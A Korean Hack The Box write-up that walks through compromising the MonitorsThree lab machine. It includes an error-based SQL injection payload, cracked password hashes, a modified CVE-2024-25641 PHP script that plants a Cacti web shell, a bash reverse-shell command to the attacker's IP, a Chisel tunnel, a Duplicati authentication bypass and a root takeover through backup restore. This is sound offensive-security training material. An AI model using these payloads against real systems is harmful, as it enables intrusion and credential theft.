---
title: "MonitorsThree (Medium)"
date: 2026-03-09
layout: single
excerpt: "MonitorsThree는 Medium 난이도의 Linux 머신으로 네트워크 솔루션을 제공하는 회사의 웹사이트를 대상으로 한 공격 체인을 다룬다. 웹사이트에는 비밀번호 재설정 기능이 존재하며 해당 페이지는 SQL Injection 취약점에 노출되어 있다. 공격자는 이 취약점을 이용해 데이터베이스에서 사용자 자격증명을 추출하고 웹 애플리케이션 접근 권한을 획득한다. 이후 웹사이트를 추가로 열거하는 과정에서 Cacti가 구동 중인 서브도메인을 발견하고 앞서 획득한 자격증명을 사용해 해당 Cacti 인스턴스에 로그인한다. Cacti 인스턴스는 CVE-2024-25641 취약점에 영향을 받으며 이를 악용해 시스템 내에서 초기 접근 권한을 획득한다. 이후 시스템 내부 열거 과정에서 데이터베이스 접근 자격증명을 발견하고 데이터베이스 내에서 해시 값을 확보한 뒤 이를 크랙하여 사용자 비밀번호를 획득한다. 마지막으로 시스템에서 열린 포트를 조사하는 과정에서 취약한 Duplicati 인스턴스가 실행 중인 것을 확인하고 해당 취약점을 악용해 marcus 사용자의 SSH 공개 키를 root 계정의 authorized_keys에 추가한 뒤 marcus의 개인 키를 이용해 SSH로 root 계정에 접속하고 최종적으로 시스템의 루트 권한을 탈취한다."
author_profile: true
toc: true
toc_label: "MonitorsThree"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/monitorsthree/monitorsthree.png
  teaser_home_page: true
categories: [hackthebox-linux]
tags: [htb, linux, web, sql-injection, error-based-sqli, cacti, cve-2024-25641, rce, hash-cracking, lateral-movement, ssh, chisel, duplicati, authentication-bypass, backup-abuse, priv-esc]

---

![MonitorsThree](/assets/htb-linux/monitorsthree/monitorsthree.png)

**MonitorsThree**는 Medium 난이도의 Linux 머신으로, 네트워크 솔루션을 제공하는 회사의 웹사이트를 대상으로 한 공격 체인을 다룬다.  

웹사이트에는 비밀번호 재설정 기능이 존재하며, 해당 페이지는 **SQL Injection 취약점**에 노출되어 있다. 공격자는 이 취약점을 이용해 데이터베이스에서 사용자 자격증명을 추출하고 웹 애플리케이션에 접근한다.

웹사이트를 추가로 열거하는 과정에서 **Cacti가 구동 중인 서브도메인**을 발견할 수 있으며, 앞서 SQL Injection을 통해 획득한 자격증명을 사용해 해당 Cacti 인스턴스에 로그인할 수 있다. 이후 Cacti 인스턴스가 **`CVE-2024-25641` 취약점**에 영향을 받는다는 것을 확인하고, 이를 악용해 시스템 내에서 초기 접근 권한을 획득한다.

시스템 내부를 추가로 열거하는 과정에서 데이터베이스 접근 자격증명을 확인할 수 있으며, 데이터베이스 내에서 해시 값을 발견한다. 공격자는 해당 해시를 크랙하여 사용자 계정의 비밀번호를 획득한다.

마지막으로 시스템에서 열린 포트를 조사하는 과정에서 **취약한 Duplicati 인스턴스**가 실행 중인 것을 확인한다. 공격자는 이 취약점을 악용해 `marcus` 사용자의 **SSH 공개 키를 root 계정의 `authorized_keys`에 추가**하고, `marcus` 의 개인 키를 이용해 SSH로 root 계정에 접속하여 최종적으로 시스템의 **루트 권한을 탈취**하게 된다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.231.115`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.231.115 | tee nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-09 01:54 EDT
Nmap scan report for 10.129.231.115
Host is up (0.27s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp   open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
8084/tcp filtered websnp
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.61 seconds
```

Nmap 스캔 결과 `SSH(22)`와 `HTTP(80)` 포트가 열려 있으며, HTTP 서비스는 `nginx 1.18.0` 기반으로 동작하고 있다. 또한 `8084` 포트는 `filtered` 상태로 확인되며, 방화벽에 의해 필터링되고 있는 것으로 보인다.

웹 페이지 접근 시 **monitorsthree.htb** 도메인으로 접근해야 함을 확인했다.

## Subdomain Enumeration

Host 헤더를 이용한 가상 호스트 기반 서브도메인 열거를 위해 `ffuf` 퍼징을 수행한 결과, `cacti.monitorsthree.htb` 서브도메인이 존재함을 확인하였다:

```bash
$ ffuf -u "http://monitorsthree.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.monitorsthree.htb" -t 100

cacti                   [Status: 200, Size: 13560, Words: 3598, Lines: 338, Duration: 299ms]
```

---

# Vulnerability Analysis

웹 페이지에 접속하면 네트워크 솔루션을 제공하는 **MonitorsThree** 회사의 메인 페이지가 나타난다:

![MonitorsThree](/assets/htb-linux/monitorsthree/website.png)

상단의 **Login** 버튼을 통해 로그인 페이지로 이동할 수 있으며, 페이지 하단에는 **Forgot password** 기능이 존재하는 것을 확인할 수 있다:

![MonitorsThree](/assets/htb-linux/monitorsthree/login.png)

발견한 서브도메인 `cacti.monitorsthree.htb` 에 접속하면 Cacti 로그인 페이지가 나타난다. 페이지 하단의 정보를 통해 해당 서비스가 `Cacti 1.2.26` 버전으로 동작하고 있음을 확인할 수 있다:

![MonitorsThree](/assets/htb-linux/monitorsthree/cacti-login.png)

## Error-based SQL Injection

`monitorsthree.htb` 의 **Forgot Password** 기능에 입력값을 테스트하던 중, 따옴표(`'`)를 입력하면 SQL 에러 메시지가 반환되는 것을 확인할 수 있었다:

![MonitorsThree](/assets/htb-linux/monitorsthree/sqli.png)

이후 Burp Suite를 이용하여 요청을 가로채고 데이터베이스 이름을 확인하기 위해 다음과 같은 페이로드를 삽입하였다:

```sql
' AND extractvalue(rand(), concat(0x3a, database()))--+-
```

해당 페이로드는 `extractvalue()` 함수의 오류 메시지를 이용하여 데이터베이스 정보를 반환하도록 유도하는 **Error-based SQL Injection** 공격이다.

응답 메시지에서 데이터베이스 이름이 `monitorsthree_db` 로 노출되는 것을 확인할 수 있다:

![MonitorsThree](/assets/htb-linux/monitorsthree/database.png)

이후 Error-based SQL Injection을 이용하여 데이터베이스의 테이블과 컬럼을 열거한 뒤 사용자 정보를 추출하였다.  

그 결과 다음과 같은 **사용자 계정과 해시된 비밀번호**를 획득할 수 있었다:

```text
admin:31a181c8372e3afc59dab863430610e8
mwatson:c585d01f2eb3e6e1073e92023088a3dd
janderson:1e68b6eb86b45f6d92f8f292428f77ac
dthompson:633b683cc128fe244b00f176c8a950f5
```

## HashCrack

추출한 비밀번호 해시는 MD5 형태로 보였으며, 이를 크랙하기 위해 `hashcat` 을 사용하였다:

```bash
$ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --username --show

admin:31a181c8372e3afc59dab863430610e8:greencacti2001
```

크랙 결과 `admin` 계정의 비밀번호가 `greencacti2001` 임을 확인할 수 있었다.

---

# Exploitation

앞서 크랙한 자격증명을 이용하여 하위 도메인 `cacti.monitorsthree.htb` 의 로그인 페이지에 접근을 시도하였다. 

그 결과 `admin` 계정으로 정상적으로 로그인에 성공하였다:

![MonitorsThree](/assets/htb-linux/monitorsthree/cacti-website.png)

## Cacti 1.2.26 Remote Code Execution (CVE-2024-25641)

현재 사용 중인 **Cacti 1.2.26** 버전에는 [CVE-2024-25641](https://shivamaharjan.medium.com/why-and-how-of-cve-2024-25641-cacti-1-2-26-cd9f9dd48352)로 알려진 **Remote Code Executionㄴ** 취약점이 존재한다.

해당 취약점은 Cacti의 `Import Packages` 기능에서 발생하는 **임의 파일 쓰기** 취약점으로 인해 발생한다.  

Cacti는 다양한 **Template Package**를 가져올 수 있는 기능을 제공하지만, 업로드되는 패키지에 대한 검증이 충분히 이루어지지 않는다.

공격자는 이를 악용하여 **조작된 패키지 파일**을 업로드할 수 있으며, 패키지 내부에 포함된 **악성 PHP 파일**을 서버에 생성할 수 있다.  

> PoC 스크립트 작성을 위해 [GitHub Security Advisory](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88)를 참고하였다.

공개된 PoC 코드를 기반으로 웹 셸을 업로드할 수 있도록 일부 코드를 수정한 뒤 `exploit.php` 파일로 저장하였다:

```php
<?php

$xmldata = "<xml>
   <files>
       <file>
           <name>resource/test.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = '<?php system($_GET["cmd"]); ?>'; # 수정
$keypair = openssl_pkey_new(); 
$public_key = openssl_pkey_get_details($keypair)["key"]; 
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz; rm test.xml");

?>
```

이후 `exploit.php` 파일을 실행시키게 되면 `test.xml.gz` 파일이 생성된 것을 확인할 수 있다:

```bash
$ php exploit.php
```

```bash
$ ls -l test.xml.gz

-rw-rw-r-- 1 kali kali 1165 Mar  9 04:43 test.xml.gz
```

`cacti.monitorsthree.htb` 에 돌아온 뒤 **Import Packages** 메뉴로 이동하였다. 이후 생성한 `test.xml.gz` 패키지를 업로드한 뒤 **Import**를 수행하였다:

![MonitorsThree](/assets/htb-linux/monitorsthree/import.png)

패키지 업로드가 성공하면 `resource` 디렉토리에 `test.php` 웹 셸이 생성된다.  

해당 파일에 `cmd` 파라미터를 전달하여 명령을 실행할 수 있으며, `id` 명령어를 통해 정상적으로 **Remote Code Execution** 이 가능한 것을 확인할 수 있다:

![MonitorsThree](/assets/htb-linux/monitorsthree/cmd-shell.png)

먼저 로컬 터미널에서 `nc` 를 이용해 리스너를 대기시켰다:

```bash
$ nc -lvnp 9001
```

이후 웹 셸의 `cmd` 파라미터를 이용하여 다음과 같은 리버스 셸 페이로드를 실행하였다:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.75/9001 0>&1'
```

명령을 실행하게 되면 `nc` 세션으로 연결이 이루어지며 웹 셸을 획득할 수 있었다:

![MonitorsThree](/assets/htb-linux/monitorsthree/web-shell.png)

---

# Privilege Escalation

## Lateral Movement: www-data → marcus

현재 시스템에서 로그인 가능한 사용자를 확인하기 위해 `/etc/passwd` 파일을 확인하였다:

```bash
www-data@monitorsthree:~/html/cacti/resource$ grep 'sh$' /etc/passwd

root:x:0:0:root:/root:/bin/bash
marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
```

그 결과 `marcus` 사용자 계정이 존재하는 것을 확인할 수 있었다.

### Database Credentials

`/var/www/html/cacti/include` 경로에서 `config.php` 파일이 존재하는 것을 확인하였다. 파일의 내용을 확인하면 데이터베이스 연결에 사용되는 자격증명이 포함되어 있다:

```bash
<?php

/**
 * Make sure these values reflect your actual database/host/user/password
 */

$database_type     = 'mysql';
$database_default  = 'cacti';
$database_hostname = 'localhost';
$database_username = 'cactiuser';
$database_password = 'cactiuser';
$database_port     = '3306';
$database_retries  = 5;
$database_ssl      = false;
$database_ssl_key  = '';
$database_ssl_cert = '';
$database_ssl_ca   = '';
$database_persist  = false;

# SKIP
?>
```

위와 같이 데이터베이스 자격증명을 확인할 수 있었으며, 해당 정보를 이용하여 데이터베이스에 접속할 수 있었다:

```bash
www-data@monitorsthree:~/html/cacti/include$ mysql -h localhost -u cactiuser -p
Enter password: cactiuser

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 644
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

데이터베이스 목록을 확인하면 다음과 같이 3개의 데이터베이스가 존재하는 것을 확인할 수 있다:

```bash
MariaDB [(none)]> show DATABASES;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.001 sec)
```

이 중 Cacti 애플리케이션에서 사용되는 `cacti` 데이터베이스로 이동한 뒤 테이블 목록을 확인하였다:

```bash
MariaDB [(none)]> use cacti

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed

MariaDB [cacti]> show tables;

+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
# SKIP
| snmpagent_notifications_log         |
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_auth_row_cache                 |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
113 rows in set (0.001 sec)
```

테이블 목록을 확인한 결과 사용자 정보가 저장되어 있을 것으로 보이는 `user_auth` 테이블을 발견하였다.

`user_auth` 테이블을 조회하면 `admin`, `guest`, `marcus` 사용자 계정과 함께 **bcrypt 형태의 비밀번호 해시**가 저장되어 있는 것을 확인할 수 있었다:

```bash
MariaDB [cacti]> select * from user_auth;

+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
| id | username | password                                                     | realm | full_name     | email_address            | must_change_password | password_change | show_tree | show_list | show_preview | graph_settings | login_opts | policy_graphs | policy_trees | policy_hosts | policy_graph_templates | enabled | lastchange | lastlogin | password_history | locked | failed_attempts | lastfail | reset_perms |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
|  1 | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |     0 | Administrator | marcus@monitorsthree.htb |                      |                 | on        | on        | on           | on             |          2 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 | -1               |        |               0 |        0 |   436423766 |
|  3 | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |     0 | Guest Account | guest@monitorsthree.htb  |                      |                 | on        | on        | on           |                |          1 |             1 |            1 |            1 |                      1 |         |         -1 |        -1 | -1               |        |               0 |        0 |  3774379591 |
|  4 | marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |     0 | Marcus        | marcus@monitorsthree.htb |                      | on              | on        | on        | on           | on             |          1 |             1 |            1 |            1 |                      1 | on      |         -1 |        -1 |                  |        |               0 |        0 |  1677427318 |
+----+----------+--------------------------------------------------------------+-------+---------------+--------------------------+----------------------+-----------------+-----------+-----------+--------------+----------------+------------+---------------+--------------+--------------+------------------------+---------+------------+-----------+------------------+--------+-----------------+----------+-------------+
```

### HashCrack

앞서 추출한 3개의 비밀번호 해시를 크랙하기 위해 `hashcat` 을 사용하였다:

```bash
$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --username --show

marcus:$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```

크랙 결과 `marcus` 사용자의 비밀번호가 `12345678910` 인 것을 확인할 수 있었다.

크랙한 자격증명을 이용하여 `su` 명령어를 이용해 `marcus` 사용자로 전환을 시도하였다:

```bash
www-data@monitorsthree:~/html/cacti/include$ su marcus
Password: 12345678910

marcus@monitorsthree:/var/www/html/cacti/include$ 
```

그 결과 정상적으로 `marcus` 사용자 셸에 접근할 수 있었다.

## Lateral Movement: marcus → root

### Netstat Enumeration

셸 접근 후, 시스템에서 열려 있는 포트를 확인하였다:

```bash
marcus@monitorsthree:/var/www/html/cacti/include$ netstat -antp

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:40669         0.0.0.0:*               LISTEN      -                    
```

이후 내부에서 열려 있는 포트를 확인한 결과 `8084`, `8200`, `40669` 포트가 열려 있는 것을 확인할 수 있었다.

`8084`와 `40669` 포트에서는 특별한 응답을 확인할 수 없었지만, `8200` 포트는 웹 서비스가 실행 중인 것으로 보였다.

`curl` 을 이용하여 확인한 결과 `/login.html` 로 리다이렉트되는 것을 확인할 수 있었다:

```bash
marcus@monitorsthree:/var/www/html/cacti/include$ curl -v http://127.0.0.1:8200

*   Trying 127.0.0.1:8200...
* Connected to 127.0.0.1 (127.0.0.1) port 8200 (#0)
> GET / HTTP/1.1
> Host: 127.0.0.1:8200
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Redirect
< location: /login.html
< Date: Mon, 09 Mar 2026 10:12:34 GMT
< Content-Length: 0
< Content-Type: 
< Server: Tiny WebServer
< Connection: close
< Set-Cookie: xsrf-token=RiIJrNJgrr4V%2BbOHv94ANlrzhu5a2qlybKiWxOIOOio%3D; expires=Mon, 09 Mar 2026 10:22:34 GMT;path=/; 
< 
* Closing connection 0
```

### Port Forwarding via Chisel

내부에서만 접근 가능한 `8200` 포트의 서비스에 접근하기 위해 [Chisel](https://github.com/jpillora/chisel)을 이용한 포트 포워딩을 수행하였다.

먼저 나의 로컬 터미널에서 Chisel 서버를 실행하였다:

```bash
$ ./chisel server -p 9002 --reverse
```

이후 대상 시스템에서 Chisel 클라이언트를 실행하여 `8200` 포트를 터널링하였다:

```bash
marcus@monitorsthree:/tmp$ ./chisel client 10.10.14.75:9002 R:8200:127.0.0.1:8200    

2026/03/09 10:30:45 client: Connecting to ws://10.10.14.75:9002
2026/03/09 10:30:47 client: Connected (Latency 261.063862ms)
```

### Duplicati Authentication Analysis

포트 포워딩 이후 `http://127.0.0.1:8200` 으로 접속하면 **[Duplicati](https://duplicati.com/)** 백업 서비스의 로그인 페이지가 나타나는 것을 확인할 수 있었다:

![MonitorsThree](/assets/htb-linux/monitorsthree/duplicati-login.png)

현재 사용 중인 Duplicati 서비스에는 [로그인 인증 우회](https://read.martiandefense.org/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) 취약점이 존재한다.

Duplicati의 인증 방식은 단순히 비밀번호를 서버로 전송하는 방식이 아니라 **`Salt` 와 `Nonce` 를 이용한 해시 기반 인증 방식**을 사용한다. 

`login.js` 파일을 확인하면 다음과 같은 JavaScript 코드가 존재하는 것을 확인할 수 있다:

```js
$.ajax({
	url: './login.cgi',
	type: 'POST',
	dataType: 'json',
	data: {'get-nonce': 1}
})
.done(function(data) {
	var saltedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Utf8.parse($('#login-password').val()) + CryptoJS.enc.Base64.parse(data.Salt)));

	var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);

	$.ajax({
		url: './login.cgi',
		type: 'POST',
		dataType: 'json',
		data: {'password': noncedpwd }
	})
```

코드를 분석하면 인증 과정은 다음과 같은 단계로 이루어진다.

먼저 `saltedpwd` 변수를 이용하여 입력한 비밀번호와 Salt 값을 결합한 뒤 SHA256 해시를 생성한다:

```js
var saltedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Utf8.parse($('#login-password').val()) + CryptoJS.enc.Base64.parse(data.Salt)));
```

이후 `noncedpwd` 변수를 이용하여 앞서 생성한 해시 값과 Nonce 값을 다시 결합하여 SHA256 해시를 생성한다:

```js
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse(data.Nonce) + saltedpwd)).toString(CryptoJS.enc.Base64);
```

마지막으로 생성된 해시 값은 `/login.cgi` 경로로 전송되며 password 파라미터로 서버에 전달된다.

그러나 Duplicati 서버 내부에는 `Duplicati-server.sqlite` 데이터베이스가 존재하며, 해당 데이터베이스에는 다음과 같은 값이 저장되어 있다:

```text
server-passphrase, server passphrase-salt
```

`server-passphrase` 값은 Base64 형태로 저장되어 있으며, 이를 **Base64 디코딩 후 Hex로 변환하면 `saltedpwd` 값과 동일한 값**이 된다.

따라서 공격자가 서버 내부에서 `server-passphrase` 값을 획득할 수 있다면 실제 로그인 비밀번호를 알지 못하더라도 `saltedpwd` 값을 직접 생성할 수 있다.

### Exploiting Duplicati Authentication

먼저 `Duplicati-server.sqlite` 파일을 로컬 시스템으로 다운로드한 뒤 `sqlite3` 를 이용하여 데이터베이스 내용을 확인하였다:

```bash
$ sqlite3 Duplicati-server.sqlite .dump > dump-file

$ cat Duplicati-server.sql

# SKIP

INSERT INTO Option VALUES(-2,'','server-passphrase','Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=');
INSERT INTO Option VALUES(-2,'','server-passphrase-salt','xTfykWV1dATpFZvPhClEJLJzYA5A4L74hX7FK8XmY0I=');

# SKIP
```

데이터베이스 내용을 확인한 결과 `server-passphrase` 와 `server-passphrase-salt` 값이 저장되어 있는 것을 확인할 수 있었다.

우선 `server-passphrase` 값을 `saltedpwd` 값으로 사용하기 위해 Base64 디코딩 후 Hex 형태로 변환하였다:

```bash
$ echo "Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=" | base64 -d | xxd -p

59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a
```

이후 Burp Suite를 이용하여 로그인 요청을 가로채고 서버로부터 전달되는 `Nonce` 와 `Salt` 값을 확인하였다:

![MonitorsThree](/assets/htb-linux/monitorsthree/salt.png)

현재 상태에서는 임의의 비밀번호를 입력하여 로그인 요청을 보내게 되므로, 해당 비밀번호를 기반으로 생성된 `noncedpwd` 값이 서버의 검증 값과 일치하지 않아 인증에 실패하게 된다:

![MonitorsThree](/assets/htb-linux/monitorsthree/fail.png)

따라서 서버에서 전달받은 `Nonce` 값을 이용하여 Hex 형태의 `saltedpwd` 값과 결합하면 `noncedpwd` 값을 생성할 수 있다:

![MonitorsThree](/assets/htb-linux/monitorsthree/noncedpwd.png)

앞서 확인한 것처럼 `server-passphrase` 값을 Base64 디코딩 후 Hex로 변환하면 `saltedpwd` 값과 동일한 값을 얻을 수 있기 때문에 실제 로그인 비밀번호를 알지 못하더라도 인증 과정에 사용되는 `noncedpwd` 값을 계산할 수 있다.

이렇게 생성한 `noncedpwd` 값을 `/login.cgi` 요청의 `password` 파라미터로 전송하면 서버는 정상적인 인증 토큰으로 인식하여 로그인 절차를 통과하게 된다:

![MonitorsThree](/assets/htb-linux/monitorsthree/success.png)

### Abusing the Backup Feature

인증 우회 이후 Duplicati 웹 인터페이스에 접근하면 다음과 같은 관리 페이지가 나타나는 것을 확인할 수 있다:

![MonitorsThree](/assets/htb-linux/monitorsthree/duplicati-website.png)

좌측 메뉴의 **Add backup** 기능을 이용하여 새로운 백업 작업을 생성할 수 있다.

새로운 백업 작업을 생성하기 위해 이름을 `test`로 설정하였으며, 암호화는 사용하지 않았다:

![MonitorsThree](/assets/htb-linux/monitorsthree/test.png)

Source Data 단계에서는 백업할 데이터를 선택할 수 있다.

여기서는 `marcus` 사용자의 `.ssh` 디렉터리 내에 존재하는 `authorized_keys` 파일을 백업 대상으로 지정하였다:

![MonitorsThree](/assets/htb-linux/monitorsthree/source.png)

모든 설정을 완료하면 `test` 라는 새로운 백업 작업이 생성된 것을 확인할 수 있다:

![MonitorsThree](/assets/htb-linux/monitorsthree/test2.png)

이후 **Run now** 버튼을 클릭하여 백업 작업을 실행하였다.

백업이 완료된 후 **Restore files** 기능을 이용하여 복원 경로를 지정할 수 있으며, 여기서는 복원 경로를 `/source/root/.ssh`로 설정하였다:

> 이 과정에서 `root` 사용자의 `authorized_keys` 파일이 `marcus` 사용자의 SSH 키로 덮어쓰여지게 되며, 이를 통해 `marcus` 의 개인 키를 이용한 `root` SSH 접속이 가능해진다.

![MonitorsThree](/assets/htb-linux/monitorsthree/path.png)

Restore 작업이 완료된 이후 `marcus` 사용자의 `.ssh` 디렉터리에서 `id_rsa` 개인 키를 확인할 수 있었으며, 해당 키를 로컬 환경으로 가져왔다.

이후 해당 개인 키를 이용하여 SSH로 `root` 계정에 접속하는 데 성공하였다:

![MonitorsThree](/assets/htb-linux/monitorsthree/root.png)

최종적으로 `root.txt` 파일을 읽어 플래그를 획득하였다:

![MonitorsThree](/assets/htb-linux/eureka/flag.png)